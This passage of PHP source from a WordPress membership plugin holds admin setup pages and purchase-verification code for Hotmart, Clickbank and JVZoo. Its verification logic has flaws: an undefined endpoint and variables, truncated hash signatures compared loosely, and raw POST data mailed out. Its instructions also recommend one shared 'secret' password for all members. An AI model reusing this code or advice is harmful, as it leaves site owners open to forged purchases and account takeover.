						<a href="#" onclick="jQuery('.hotmart_secretid').show(); jQuery(this).hide(); return false;">Click to Show</a>
						<?php endif; ?>
						<input type="text" name="hotmart_secretid" class="hotmart_secretid" <?php if ($membergenius->model->setting("hotmart_secretid")): ?>style="display:none;"<?php endif; ?> value="<?php echo htmlentities($membergenius->model->setting("hotmart_secretid")); ?>" size="25" />
					</label>
					<input class="hotmart_secretid" type="submit" <?php if ($membergenius->model->setting("hotmart_secretid")): ?>style="display:none;"<?php endif; ?> class="button-secondary" value="Save Client Secret" />
					</blockquote></p>
					<p><blockquote>
					<label><b>Basic:</b>
						<?php if ($membergenius->model->setting("hotmart_basic")): ?>
						<a href="#" onclick="jQuery('.hotmart_basic').show(); jQuery(this).hide(); return false;">Click to Show</a>
						<?php endif; ?>
						<input type="text" name="hotmart_basic" class="hotmart_basic" <?php if ($membergenius->model->setting("hotmart_basic")): ?>style="display:none;"<?php endif; ?> value="<?php echo htmlentities($membergenius->model->setting("hotmart_basic")); ?>" size="25" />
					</label>
					<input class="hotmart_basic" type="submit" <?php if ($membergenius->model->setting("hotmart_basic")): ?>style="display:none;"<?php endif; ?> class="button-secondary" value="Save Basic" />
					</blockquote></p>
				</ol>
			</blockquote><br />
		<h3><b style="background-color:yellow;">Step 3:</b> Set Thank You Page</h3>
			<blockquote>
				<blockquote>
					<ul>
						<li>
							<h3>A) Copy your thank you page.</h3>
							<blockquote>
								<ol style="list-style-type:upper-alpha;">
								<p align="center">
									<textarea name="membergenius_checkout" id="membergenius_checkout" cols="60" rows="2" class="code" style="font-size:18px; font-weight:bold; background-color:white;" readonly="readonly"><?php echo plugins_url('/miembro-press/request.php', dirname(__FILE__) ) ?></textarea><br />
									<input style="text-align:center;" type="submit" class="button-secondary" onclick="document.getElementById('membergenius_checkout').select(); return false;" value="Select All" />
								</p>
								</ol>
							</blockquote>
						</li>
						<br />
						<li>
							<h3>B) Go to "Checkout Configurations" -> Thank You Page Options -> External Page and Paste Your Thank You Page:</h3>
						</li>
					</ul>
				</blockquote>
			</blockquote><br />
		<h3><b style="background-color:yellow;">Step 4:</b> Enter Product ID from Hotmart</h3>
			<p>It should be a 6-digit number printed like this:<br />
			<code>BASIC INFORMATION FOR PRODUCT ID: 111222</code></p>
			<p>Enter that product ID in the table below corresponding to the level you want to grant access to.</p>
			<blockquote>
				<p><table class="widefat" style="width:400px;">
				<thead>
				<tr>
					<th scope="col">Level Name to Provide Access To...</th>
					<th scope="col" style="text-align:center;">Product ID</th>
				</tr>
				</thead>
				<?php foreach ($levels as $level): ?>
				<?php $item = "";
				if (isset($items[$level->ID])) {
					$item = $items[$level->ID];
				} else {
					$item = "";
				} ?>
				<tr>
				<td><?php echo htmlentities($level->level_name); ?></td>
				<td style="text-align:center;"><input type="text" size="10" name="membergenius_hotmart_item[<?php echo htmlentities($level->ID); ?>]" value="<?php echo $item; ?>" /> </td>
				<?php endforeach; ?>
				</table></p>
				<p><input type="submit" class="button" value="Save Hotmart Product IDs" /></p>
			</blockquote>
		<p><input type="submit" class="button-primary" value="Save Settings" /></p>
	<?php
	}

	function verify() {
		global $membergenius;
		$info = null;
		MemberGenius::clearCache();
		if (isset($_GET["transaction"])) {
			$info = $this->verifyPDT($_GET["transaction"], $_GET["aff"], $membergenius->model->setting("hotmart_token"));
		}
		$transaction = null;
		if (isset($info["transaction_ext"])) {
			$transaction = $info["transaction_ext"];
		}
		$status = null;
		if (isset($info["status"])) {
			$status = $info["status"];
		}

		if (isset($info["first_name"]) && isset($info["last_name"]) && isset($info["email"]) && isset($info["prod"])) {
			$result = array( "firstname" => $info["first_name"], "lastname" => $info["last_name"], "email" => $info["email"], "username" => $info["first_name"]." ".$info["last_name"], "level" => intval($info["prod"]), "transaction" => $transaction, "action" => "register" );
		} else {
			$result = array();
		}

		if ($status == "expired" || $status == "refunded" || $status == "canceled") {
			$result["action"] = "cancel";
		}
		return $result;
	}

	function verifyPDT($transaction, $aff, $token) {
		$post = wp_remote_post(htmlentities($checkout), array( "body" => array("transaction" => $transaction, "aff" => $aff, "hottok" => $token), "httpversion" => 1.1 ) );
		$body = wp_remote_retrieve_body($post);
		$lines = explode(" ", $body);
		$result = array();
		if (trim($lines[0]) != "SUCCESS") { return null; }
		foreach ($lines as $line) {
			$key = null;
			$value = null;
			$fields = @explode("=", trim($line));
			if (count($fields) == 1) {
				list($key) = $fields;
			} else {
				list($key, $value) = $fields;
			}
			if ($value !== null) {
				$result[$key] = urldecode($value);
			}
		}
		return $result;
	}
}

class MemberGeniusCartGeneric extends MemberGeniusCart {
	function instructions() {
		global $membergenius; ?>
		<h3>Automatic Registration</h3>
         <p><?php echo chr(89); ?>ou can either use MiembroPress to build a list of free members or charge them for one-time access.</p>
         <p>Just make sure to set your thank you URL of your payment button to the level where you want to provide access:</p>
         <p><table class="widefat" style="width:400px;">
         <thead>
         <tr>
            <th scope="col" style="text-align:center;"><nobr>Level Name</nobr></th>
            <th scope="col">Thank <?php echo chr(89); ?>ou URL / Return URL</th>
         </tr>
         </thead>
         <?php foreach ($membergenius->model->getLevels() as $level): ?>
         <tr>
            <td style="text-align:center;"><?php echo htmlentities($level->level_name); ?></td>
            <td><a href="<?php echo $membergenius->model->signupURL($level->level_hash); ?>" target="_blank"><?php echo $membergenius->model->signupURL($level->level_hash); ?></a></td>
         <?php endforeach; ?>
         </table></p>

         <p>(<b>Note:</b> It is HIGHL<?php echo chr(89); ?> suggested that if you click this link, you instead Right-Click and choose the <code>Open in Incognito Window</code> option.</p>

         <blockquote>
         <p>For example, to take PayPal payments using a BUSINESS (not a Personal or Premier account), complete the following steps:</p>

         <ol>
            <li>Login to <a target="_blank" href="https://www.paypal.com">PayPal.com</a> and click the &quot;Merchant Services&quot; tab</li>
            <li>Click &quot;Create payment buttons for your website&quot;</li>
            <li>Choose to create a &quot;Buy Now&quot; button</li>
            <li>Type in the &quot;Item Name&quot; to be the name of your product (i.e. <code><?php echo get_option("blogname"); ?></code>, and choose the &quot;Price&quot; such as <code>7.00</code></li>
            <li>Under Step 2, be sure <code>Save button at PayPal</code> is checked</li>
            <li>Scroll down to Step 3 (Customize advanced features)</li>
            <li>Be sure to uncheck &quot;Take customers to this URL when they cancel their checkout&quot;</li>

            <li>Check the &quot;Take customers to this URL when they finish checkout&quot; box and set it to the level you want: <code><?php echo $url; ?></code></li>

            <p><table class="widefat" style="width:400px;">
            <thead>
            <tr>
               <th scope="col" style="text-align:center;"><nobr>Level Name</nobr></th>
               <th scope="col">Thank <?php echo chr(89); ?>ou URL / Return URL</th>
            </tr>
            </thead>

            <?php foreach ($membergenius->model->getLevels() as $level): ?>
            <tr>
               <td style="text-align:center;"><?php echo htmlentities($level->level_name); ?></td>
               <td><a href="<?php echo $membergenius->model->signupURL($level->level_hash); ?>" target="_blank"><?php echo $membergenius->model->signupURL($level->level_hash); ?></a></td>
            <?php endforeach; ?>
            </table></p>

            <li>Click &quot;Create Button&quot;</li>
            <li>Click the &quot;Email&quot; tab and grab your payment button, such as <code>https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=123</code>
         </ol>
         </blockquote>

         <p><?php echo chr(89); ?>ou can now either direct link to this button or use a sales letter template such as <a target="_blank" href="http://www.papertemplate.com">Paper Template</a> to host your sales letter and display your payment button.</p>

         <h3>Manual Registration</h3>

         <p>When activated, MiembroPress will protect all the pages and posts on your blog. Once AN<?php echo chr(89); ?> WordPress users logs in, they will get access to all the content on your blog.</p>

         <p>This means you can manually <a href="user-new.php">add new users</a> to your site at any time.</p>

         <p><?php echo chr(89); ?>ou could also great a &quot;catch-all&quot; user, for example, <a href="user-new.php">create a new user</a> with username &quot;secret&quot; and password &quot;secret&quot; and give this for ALL your members to share the same login information.</p>
      <?php
	}
}

class MemberGeniusCartClickbank extends MemberGeniusCart {
	function instructions() {
		global $membergenius;
		if (isset($_POST["clickbank_token"])) {
			$token = trim($_POST["clickbank_token"]);
			if (!$token) { $token = null; }
			$membergenius->model->setting("clickbank_token", $token);
		}
		$secret = $membergenius->model->setting("clickbank_secret");
		$token = $membergenius->model->setting("clickbank_token");
		if (!$token) {
			$token = $membergenius->model->setting("clickbank_token", rand(10000000, 99999999));
		}
		if (isset($_POST["clickbank_account"])) {
			$account = preg_replace('@[^A-Z0-9]@si', '', stripslashes($_POST["clickbank_account"]));
			$membergenius->model->setting("clickbank_account", $account);
		}
		$account = $membergenius->model->setting("clickbank_account");
		if (!$account) { $account = "account_nickname"; }
		if (isset($_POST["membergenius_clickbank_item"]) && is_array($_POST["membergenius_clickbank_item"])) {
			$items = array();
			foreach ($_POST["membergenius_clickbank_item"] as $key => $value) {
				$items[$key] = $value;
			}
			$membergenius->model->setting("clickbank_items", $items);
		}
		$items = $membergenius->model->setting("clickbank_items");
		if (!is_array($items)) { $items = array(); }
		$levels = $membergenius->model->getLevels();
		$firstLevel = reset($levels);
		$checkout = $membergenius->model->signupURL($secret); ?>
      <h3>Clickbank Payment</h3>

      <p>In order to accept payments using Clickbank, you must:</p>

      <ul style="list-style:disc; padding-left:25px;">
         <li>Register a Clickbank SELLER account by registering at the <a target="_blank" href="https://accounts.clickbank.com/public/#/signup/form/key/">Clickbank</a> website</li>
         <li>Set your &quot;Clickbank secret key&quot; to match both this page and your &quot;My Site&quot; area in Clickbank</li>
         <li>Paste in the &quot;Clickbank IPN URL&quot; we give you</li>
         <li>Create a Clickbank product (or edit your existing one)</li>
         <li>Edit that product and set the &quot;thank you&quot; page we provide you</li>
         <li>Pay Clickbank's one-time $49.95 activation charge so that you can begin taking payments</li>
      </ul>

      <div style="width:800px;">
      <h3><b style="background-color:yellow;">Step 1:</b> Configure Clickbank Account Information</h3>

      <p>After you've created your Clickbank account, login at <a target="_blank" href="http://www.clickbank.com">Clickbank.com</a>. In the top tabs, go to Settings, My Site, scroll down to &quot;Advanced Tools&quot; and click Edit. The Secret Key is on that page.</p>

      <p>Be sure the secret key on Clickbank's site matches the secret key here.</p>

      <p><blockquote>
      <label><b>Clickbank Secret Key:</b>
      <?php if ($membergenius->model->setting("clickbank_token")): ?>
      <a href="#" onclick="jQuery('.clickbank_token').show(); jQuery(this).hide(); return false;">Click to Show</a>
      <?php endif; ?>

      <input type="text" name="clickbank_token" class="clickbank_token" <?php if ($membergenius->model->setting("clickbank_token")): ?>style="display:none;"<?php endif; ?> value="<?php echo htmlentities($membergenius->model->setting("clickbank_token")); ?>" size="25" />
         </label> <input class="clickbank_token" type="submit" <?php if ($membergenius->model->setting("clickbank_token")): ?>style="display:none;"<?php endif; ?> class="button-secondary" value="Save Clickbank Secret Key" />
      </blockquote>

      <blockquote>
      <label><b>Clickbank Account Name:</b>
      <input type="text" name="clickbank_account" value="<?php echo htmlentities($membergenius->model->setting("clickbank_account")); ?>" size="20" />
      </label>
      </blockquote></p>

      <p><input type="submit" class="button" value="Save Account Settings" /></p>

      <h3><b style="background-color:yellow;">Step 2:</b> Set Clickbank &quot;Instant Payment Notification&quot; Settings</h3>

      <p>While you're still in the &quot;Advanced Tools&quot; page (Settings, My Site, Advanced Tools, Edit) copy the URL below and paste it in as the Instant Notification URL. Set &quot;Version&quot; to <code>4.0</code>.</p>

      <blockquote>
         <p align="center">
         <textarea name="membergenius_notify" id="membergenius_notify" cols="60" rows="2" class="code" style="font-size:18px; font-weight:bold; background-color:white;" readonly="readonly"><?php echo htmlentities($checkout); ?></textarea><br />
         <input style="text-align:center;" type="submit" class="button-secondary" onclick="document.getElementById('membergenius_notify').select(); return false;" value="Select All" />
         </p>
      </blockquote>

      <h3><b style="background-color:yellow;">Step 3:</b> Create Product in Clickbank</h3>

      <p>Your account is ready to go, now let's create your product within Clickbank. Go to Settings, My Products, Add New: Product.</p>

      <ul style="list-style:disc; padding-left:25px;">
         <li><b>Product Type:</b> One-Time Digital Product</li>
         <li><b>Product Category:</b> Website Membership</li>
         <li><b>Product Title:</b> Name of Your Product</li>
         <li><b>Language:</b> English</li>
         <li><b>Pitch Page URL:</b> the URL to your sales letter</li>
         <li><b>Product Price:</b> the price you'll charge for your product (minimum $3)</li>
         <li><b>Thank You Page URL:</b> set this to the URL below</li>
      </ul>

      <blockquote>
         <p align="center">
         <textarea name="membergenius_notify" id="membergenius_thankyou" cols="60" rows="2" class="code" style="font-size:18px; font-weight:bold; background-color:white;" readonly="readonly"><?php echo htmlentities($checkout); ?></textarea><br />
         <input style="text-align:center;" type="submit" class="button-secondary" onclick="document.getElementById('membergenius_thankyou').select(); return false;" value="Select All" />
         </p>
      </blockquote>

      <p>Click <b>&quot;Save Product&quot;</b> to finish creating your product.</p>

      <blockquote>
      <p><i>If you want to create a recurring product in the steps above (fixed-term or continuity as opposed to a single-payment product) just choose &quot;Recurring Digital Product&quot; for the Product Type.</i></p>

      <p><i>The only difference with this setting is that you'll have extra text boxes to fill out to define the Initial Product Price (first payment amount), Recurring Product Price (amount charged each subsequent billing), Rebill Frequency (re-bill weekly or monthly), and Subscription Duration (how many total payments, such as 5 payments, or unlimited).</i></p>
      </blockquote>

      <h3><b style="background-color:yellow;">Step 4:</b> Match Clickbank Item IDs to Membership Levels</h3>

      <p>View your products in the Clickbank control panel by going to Settings, My Products. On the left-most column of each product you sell, you'll see an &quot;Item&quot; column. Copy the item of the product you created, and paste it below next to the membership level you want to grant access to, after that person purchases that item.</p>

      <p>

      <blockquote>
         <p><table class="widefat" style="width:800px;">
         <thead>
         <tr>
            <th scope="col" style="width:250px;">Level to Provide Access To...</th>
            <th scope="col" style="width:150px; text-align:center;">Clickbank Item</th>
            <th scope="col" style="text-align:left;">Clickbank Payment Link</th>
         </tr>
         </thead>

         <?php foreach ($levels as $level): ?>
         <?php $item = "";
    if (isset($items[$level->ID])) {
        $item = $items[$level->ID];
    } else {
        $item = "";
    }
    if ($item) {
        $link = "http://" . $item . "." . $account . ".pay.clickbank.net/?sku=" . $level->ID;
    } else {
        $link = '';
    } ?>
         <tr>
            <td><?php echo htmlentities($level->level_name); ?></td>
            <td style="text-align:center;"><input type="text" size="3" name="membergenius_clickbank_item[<?php echo htmlentities($level->ID); ?>]" value="<?php echo $item; ?>" /> </td>
            <td>
               <?php if ($link): ?>
               <nobr><a target="_blank" href="<?php echo htmlentities($link); ?>"><?php echo htmlentities($link); ?></a></nobr>
               <?php else: ?>
               &nbsp;
               <?php endif; ?>
            </td>
         <?php endforeach; ?>
         </table></p>
      </blockquote>

      <p><input type="submit" class="button" value="Save Clickbank ID's" /></p>

      <h3><b style="background-color:yellow;">Step 5:</b> Test Your Payment Button</h3>

      <p>In your Clickbank account, go to Settings, My Site. Scroll down to the &quot;Testing Your Products&quot; section. Click the &quot;Edit&quot; link on the site. On the page that loads, click &quot;Generate New Card Number.&quot;</p>

      <p>Click on the appropriate &quot;pay&quot; link above (in Step 4) and check out using the test credit card numnber, expiration date, and validation code provided to you by Clickbank.</p>

      <h3><b style="background-color:yellow;">Step 5:</b> Copy the Buy Button Code from Clickbank and Paste Into Your Sales Letter</h3>

      <blockquote>
      <p>The &quot;Clickbank Payment Link&quot; in the table above (Step 3) is the link you'll place on your website to accept payments.</p>

      <p>Grab the HTML code to place on your web pages. We use <a target="_blank" href="http://www.papertemplate.com">Paper Template</a> to present sales letters to customers.</p>
      </blockquote>

      <p><input type="submit" class="button-primary" value="Save Settings" /></p>
      </div>
      <?php
 }

	function verify() {
		global $membergenius;
		$info = null;
		MemberGenius::clearCache();
		if (isset($_POST["ctransaction"]) && $_POST["ctransaction"] == "TEST" && $_POST["ccustemail"] == "testuser@somesite.com") {
			ob_end_clean();
			header("HTTP/1.1 200 OK");
			die();
		}
		if (isset($_GET["cbreceipt"])) {
			$info = $this->verifyPDT($_GET, $membergenius->model->setting("clickbank_token"));
		} elseif (isset($_POST["caffitid"])) {
			$info = $this->verifyIPN($_POST, $membergenius->model->setting("clickbank_token"));
		}
		if (!$info || count($info) == 0) { return false; }
		$items = $membergenius->model->setting("clickbank_items");
		if (!is_array($items)) { $items = array(); }
		if (isset($info["ccustname"]) && isset($info["ccustemail"]) && isset($info["cproditem"]) && isset($info["ctransreceipt"])) {
			parse_str($info["cvendthru"], $cvendthru);
			if (isset($cvendthru["sku"])) { $sku = $cvendthru["sku"]; }
			else { $level = array_search($info["cproditem"], $items); }
			list($firstname, $lastname) = preg_split('@ @', trim($info["ccustname"]), 2);
			$result = array( "firstname" => $firstname, "lastname" => $lastname, "email" => $info["ccustemail"], "username" => $firstname." ".$lastname, "level" => $level, "transaction" => $info["ctransreceipt"], "action" => "register" );
		} elseif (isset($info["cbreceipt"]) && isset($info["cname"]) && isset($info["cemail"])) {
			list($firstname, $lastname) = preg_split('@ @', trim($info["cname"]), 2);
			if (isset($info["sku"])) {
				$level = @intval($info["sku"]);
			} else {
				$level = array_search($info["item"], $items);
			}
			if (!$level) { $result = array(); }
			else { $result = array( "firstname" => $firstname, "lastname" => $lastname, "email" => $info["cemail"], "username" => $firstname." ".$lastname, "level" => $level, "transaction" => $info["cbreceipt"], "action" => "register" );}
		} else { $result = array(); }
		$status = null;
		if (isset($info["ctransaction"])) { $status = $info["ctransaction"]; }
		if ($status == "RFND" || $status == "CGBK" || $status == "INSF" || $status == "CANCEL-REBILL") { $result["action"] = "cancel"; }
		return $result;
	}

	function verifyPDT($vars, $secretKey) {
		$rcpt=$_REQUEST['cbreceipt'];
		$time=$_REQUEST['time'];
		$item=$_REQUEST['item'];
		$cbpop=$_REQUEST['cbpop'];
		$xxpop=sha1("$secretKey|$rcpt|$time|$item");
		$xxpop=strtoupper(substr($xxpop,0,8));
		if ($cbpop==$xxpop) { return $vars; }
		return array();
	}

	function verifyIPN($post, $secretKey) {
		global $membergenius;
		$unescape = get_magic_quotes_gpc();
		$fields = array('ccustname', 'ccustemail', 'ccustcc', 'ccuststate', 'ctransreceipt', 'cproditem', 'ctransaction', 'ctransaffiliate', 'ctranspublisher', 'cprodtype', 'cprodtitle', 'ctranspaymentmethod', 'ctransamount', 'caffitid', 'cvendthru', 'cverify');
		if ($membergenius->model->setting("notify")==1) { $this->notify(); }
		$vars = array();
		foreach ($fields as $field) {
			if (isset($post[$field])) {
				$vars[$field] = $post[$field];
			}
		}
		$pop = "";
		$ipnFields = array();
		foreach ($vars AS $key => $value) {
			if ($key == "cverify") { continue; }
			$ipnFields[] = $key;
		}
		foreach ($ipnFields as $field) {
			if ($unescape) {
				$pop .= stripslashes($post_vars[$field]) . "|";
			} else { $pop .= $vars[$field] . "|"; }
		}
		$pop = $pop . $secretKey;
		$calcedVerify = sha1(mb_convert_encoding($pop, "UTF-8"));
		$calcedVerify = strtoupper(substr($calcedVerify,0,8));
		if ($calcedVerify == $vars["cverify"]) { return $vars; }
		return array();
	}

	public function notify() {
		$subject = "[IPN] Clickbank Notification Log";
		$price = "";
		if (isset($_POST["ctransamount"])) { $price = floatval($_POST["ctransamount"]/100); } if ($price == "") { $thePrice = ""; } else { $thePrice = "" . number_format($price, 2); } if ($_POST["ctransaction"] == "RFND" || $_POST["ctransaction"] == "CGBK" || $_POST["ctransaction"] == "INSF") { $subject .= " (REFUND".$thePrice.")"; } elseif ($_POST["ctransaction"] == "SALE") { $subject .= " (SALE".$thePrice.")"; } elseif ($_POST["ctransaction"] == "BILL") { $subject .= " (REBILL".$thePrice.")"; } elseif ($_POST["ctransaction"] == "CANCEL-REBILL") { $subject .= " (CANCELLATION".$thePrice.")"; } $paymentDate = 0; if (isset($_POST["ctranstime"])) { $paymentDate = intval($_POST["ctranstime"]); } else { $paymentDate = time(); } $message = "A new sale/refund was processe for customer ".htmlentities($_POST["ccustemail"]); if ($paymentDate) { $message .= " on ".date("m/d/".chr(89), $paymentDate)." at ".date("g:i A e", $paymentDate); } $message .= "Details: "; foreach ($_POST as $key => $value) { $message .= $key.': '.$value." "; } $this->email($subject, $message);
	}
}

class MemberGeniusCartJVZ extends MemberGeniusCart {
	function instructions() {
		global $membergenius;
		if (isset($_POST["jvz_token"])) {
			$token = trim($_POST["jvz_token"]);
			if (!$token) { $token = null; }
			$membergenius->model->setting("jvz_token", $token);
		}
		$secret = $membergenius->model->setting("jvz_secret");
		$token = $membergenius->model->setting("jvz_token");
		if (!$token) {
			$token = $membergenius->model->setting("jvz_token", rand(10000000, 99999999));
		}
		$levels = $membergenius->model->getLevels();
		$firstLevel = reset($levels);
		$checkout = $membergenius->model->signupURL($secret);
		if (isset($_POST["membergenius_jvz_item"]) && is_array($_POST["membergenius_jvz_item"])) {
			$items = array();
			foreach ($_POST["membergenius_jvz_item"] as $key => $value) {
				$value = @intval($value);
				if ($value > 0) { $items[$key] = $value; }
			}
			$membergenius->model->setting("jvz_items", $items);
		}
		$items = $membergenius->model->setting("jvz_items");
		if (!is_array($items)) { $items = array(); }
		?>
		<h3>JVZoo Payment</h3>
		<p>In order to accept payments using JV Zoo, you must:</p>
		<ul style="list-style:disc; padding-left:25px;">
			<li>Register a JVZoo SELLER account by registering at the <a target="_blank" href="https://www.jvzoo.com/sellers">JVZoo Seller</a> website</li>
			<li>Set your &quot;JVZIPN secret key&quot; to match both this page and your &quot;My Account&quot; area in JVZoo</li>
			<li>Create a JVZoo product (or edit your existing one)</li>
			<li>Edit that product and set the &quot;thank you&quot; page we provide you</li>
			<li>Check the &quot;pass parameters&quot; box</li>
			<li>Paste in the &quot;JVZIPN URL&quot; we give you, set &quot;JVZIPN Special Integration&quot; to &quot;Wishlist Member&quot; and paste in the &quot;Wishlist SKU&quot; we give you</li>
		</ul>
		<div style="width:800px;">
			<h3>Step 1: Configure JVZoo Settings &amp; Secret Key</h3>
			<blockquote>
				<ol style="list-style-type:upper-alpha;">
					<li><input type="checkbox" /> If you don't yet have a JVZoo Seller account, <a target="_blank" href="https://www.jvzoo.com/sellers">go to their website and create one</a>. It requires a <a target="_blank" href="https://www.paypal.com">PayPal account</a>, and they'll have you click through steps to link your PayPal account and pre-authorize payments to affiliates.</li>
					<li><input type="checkbox" /> After you've created that seller account, go to <code>My Account, My Account</code>, and next to <code>JVZIPN Secret Key</code>, click the link that says: <code>Click here to edit JVZIPN Secret Key</code>.</li>
					<li><input type="checkbox" /> Copy the JVZoo secret key from below (or match the one below if your account already has one.</li>
					<p><blockquote>
					<label><b>JVZoo Secret Key:</b>
						<?php if ($membergenius->model->setting("jvz_token")): ?>
						<a href="#" onclick="jQuery('.jvz_token').show(); jQuery(this).hide(); return false;">Click to Show</a>
						<?php endif; ?>
						<input type="text" name="jvz_token" class="jvz_token" <?php if ($membergenius->model->setting("jvz_token")): ?>style="display:none;"<?php endif; ?> value="<?php echo htmlentities($membergenius->model->setting("jvz_token")); ?>" size="25" />
					</label>
					<input class="jvz_token" type="submit" <?php if ($membergenius->model->setting("jvz_token")): ?>style="display:none;"<?php endif; ?> class="button-secondary" value="Save JVZoo Secret Key" />
					</blockquote></p>
					<li><input type="checkbox" /> Be sure to click the <code>Save</code> button to apply this change to your account.</li>
				</ol>
			</blockquote>
			<h3>Step 2: Create JVZoo Product</h3>
			<blockquote>
				<ol style="list-style-type:upper-alpha;">
					<li><input type="checkbox" /> Create your product in the JVZoo member's area by going to <code>Sellers, Seller's Dashboard</code>.</li>
					<li><input type="checkbox" /> Click the giant yellow button that says: <code>Add A Product (It's FREE!)</code></li>
					<li><input type="checkbox" /> Fill in the name, price, commission payout, support email address, landing page (i.e. <code><?php if (is_ssl()): ?>https://<?php else: ?>http://<?php endif; ?><?php echo $_SERVER["HTTP_HOST"]; ?></code>, sales page URL (i.e. <code><?php if (is_ssl()): ?>https://<?php else: ?>http://<?php endif; ?><?php echo $_SERVER["HTTP_HOST"]; ?></code>).</li>
					<li><input type="checkbox" /> Set <code>Delivery Method</code> to <code>Thank <?php echo chr(89); ?>ou Page</code> (NOT Protected Download).</li>
				</ol>
			</blockquote>
			<h3>Step 3: Set Thank <?php echo chr(89); ?>ou Page</h3>
			<blockquote>
				<ol style="list-style-type:upper-alpha;">
				<p><input type="checkbox" /> While you're still creating that JVZoo product, be SURE that you check <code>Pass parameters to Download Page.</code> This is extremely important.</p>
				<p><input type="checkbox" /> Set the <code>Thank <?php echo chr(89); ?>ou / Download Page</code> to the URL below:</p>
				<p align="center">
					<textarea name="membergenius_checkout" id="membergenius_checkout" cols="60" rows="2" class="code" style="font-size:18px; font-weight:bold; background-color:white;" readonly="readonly"><?php echo htmlentities($checkout); ?></textarea><br />
					<input style="text-align:center;" type="submit" class="button-secondary" onclick="document.getElementById('membergenius_checkout').select(); return false;" value="Select All" />
				</p>
				</ol>
			</blockquote>

			<h3>Step 4: Set the &quot;External Program Integration&quot; Settings</h3>

			<blockquote>
				<ol style="list-style-type:upper-alpha;">
					<li><input type="checkbox" /> Under <code>Recommended: Method #1</code>, set your <code>JVZIPN IPN URL</code> to the URL below:</li>

					<blockquote>
						<p align="center">
						<textarea name="membergenius_notify" id="membergenius_notify" cols="60" rows="2" class="code" style="font-size:18px; font-weight:bold; background-color:white;" readonly="readonly"><?php echo htmlentities($checkout); ?></textarea><br />
						<input style="text-align:center;" type="submit" class="button-secondary" onclick="document.getElementById('membergenius_notify').select(); return false;" value="Select All" />
						</p>
					</blockquote>

					<li><input type="checkbox" /> Set <code>Use JVZIPN Output as Key Generation</code> to <code>NO</code>.</li>

					<li><input type="checkbox" /> Set the <code>JVZIPN Special Integration</code> dropdown to <code>Wishlist Member</code>.</li>
				</ol>
				<h3>Step 5: Enter Product ID from JVZoo</h3>
				<p><input type="checkbox" /> Find the product ID in JVZoo. This should be near the top of the Edit Product page, above &quot;Allow Sales.&quot;</p>
				<p>It should be a 6-digit number printed like this:<br />
				<code>BASIC INFORMATION FOR PRODUCT ID: 111222</code></p>
				<p>Enter that product ID in the table below corresponding to the level you want to grant access to.</p>
				<blockquote>
					<p><table class="widefat" style="width:400px;">
					<thead>
					<tr>
						<th scope="col">Level Name to Provide Access To...</th>
						<th scope="col" style="text-align:center;">Product ID</th>
					</tr>
					</thead>
					<?php foreach ($levels as $level): ?>
					<?php $item = "";
					if (isset($items[$level->ID])) {
						$item = $items[$level->ID];
					} else {
						$item = "";
					} ?>
					<tr>
					<td><?php echo htmlentities($level->level_name); ?></td>
					<td style="text-align:center;"><input type="text" size="10" name="membergenius_jvz_item[<?php echo htmlentities($level->ID); ?>]" value="<?php echo $item; ?>" /> </td>
					<?php endforeach; ?>
					</table></p>
					<p><input type="submit" class="button" value="Save JVZoo Product IDs" /></p>
				</blockquote>
			</blockquote>
			<h3>Step 6: Create <?php echo chr(89); ?>our Test Button in JVZoo</h3>
			<blockquote>
				<ol style="list-style-type:upper-alpha;">
					<li><input type="checkbox" /> Go to <code>Seller, Seller's Dashboard</code>, then under the <code>Additional Functions</code> subtitle on that page, click the <code>Test Purchases</code> button.</li>
					<li><input type="checkbox" /> On the next screen, find the product you just created in the dropdown list, and click <code>Create Test Purchase Code</code>.</li>
					<li><input type="checkbox" /> Be sure you're logged out of this membership site. The JVZoo page will give you a <code>Buy / Link</code>. Right click and open this link in a <code>New Incognito Window</code>. This will send you to a checkout page where you'll use a second PayPal account to pay $0.01 and verify that the checkout process works for you.</li>
					<li><input type="checkbox" /> Pay the $0.01, be redirected to your JVZoo purchases, click <code>Access <?php echo chr(89); ?>our Purchase</code> and you'll end up at your MiembroPress registration page to create an account for the product you just test-purchased.</li>
				</ol>
			</blockquote>
			<h3>Step 6: Copy the Buy Button Code from JVZoo and Paste Into <?php echo chr(89); ?>our Sales Letter</h3>
			<blockquote>
				<p><input type="checkbox" /> Go to <code>Seller, Seller's Dashboard</code>, find the product you just created, and click <code>Buy Buttons</code>. This will take you to a new screen where you are presented with special code to place on your website to accept payments.</p>
				<p>Grab the HTML code to place on your web pages. We use <a target="_blank" href="http://www.papertemplate.com">Paper Template</a> to present sales letters to customers.</p>
			</blockquote>
			<p><input type="submit" class="button-primary" value="Save Settings" /></p>
		</div>
		<?php
	}

	function verify() {
		global $membergenius;
		$info = null;
		MemberGenius::clearCache();
		if (isset($_GET["cbreceipt"])) {
			$info = $this->verifyPDT($_GET, $membergenius->model->setting("jvz_token"));
		} elseif (isset($_POST["caffitid"])) {
			$info = $this->verifyIPN($_POST, $membergenius->model->setting("jvz_token"));
		}
		if (!$info || count($info) == 0) { return false; }
		if (isset($info["ccustname"]) && isset($info["ccustemail"]) && isset($info["cproditem"]) && isset($info["ctransreceipt"])) {
			parse_str($info["cvendthru"], $cvendthru);
			if (isset($cvendthru["sku"])) {
				$sku = $cvendthru["sku"];
			} else { $sku = 0; }
			list($firstname, $lastname) = preg_split('@ @', trim($info["ccustname"]), 2);
			$result = array( "firstname" => $firstname, "lastname" => $lastname, "email" => $info["ccustemail"], "username" => $firstname." ".$lastname, "level" => intval($sku), "transaction" => $info["ctransreceipt"], "action" => "register" );
		} elseif (isset($info["cbreceipt"]) && isset($info["cname"]) && isset($info["cemail"])) {
			list($firstname, $lastname) = preg_split('@ @', trim($info["cname"]), 2);
			$result = array( "firstname" => $firstname, "lastname" => $lastname, "email" => $info["cemail"], "username" => $firstname." ".$lastname, "transaction" => $info["cbreceipt"], "action" => "register" );
			if (isset($info["sku"])) { $result["level"] = @intval($info["sku"]); }
		} else { $result = array(); }
		$status = null;
		if (isset($info["ctransaction"])) { $status = $info["ctransaction"]; }
		if ($status == "RFND" || $status == "CGBK" || $status == "INSF" || $status == "CANCEL-REBILL") {
			$result["action"] = "cancel";
		}
		return $result;
	}

	function verifyPDT($vars, $secretKey) {
		$rcpt=$_REQUEST['cbreceipt'];
		$time=$_REQUEST['time'];
		$item=$_REQUEST['item'];
		$cbpop=$_REQUEST['cbpop'];
		$xxpop=sha1("$secretKey|$rcpt|$time|$item");
		$xxpop=strtoupper(substr($xxpop,0,8));
		if ($cbpop==$xxpop) { return $vars; }
		return array();
	}

	function verifyIPN($post, $secretKey) {
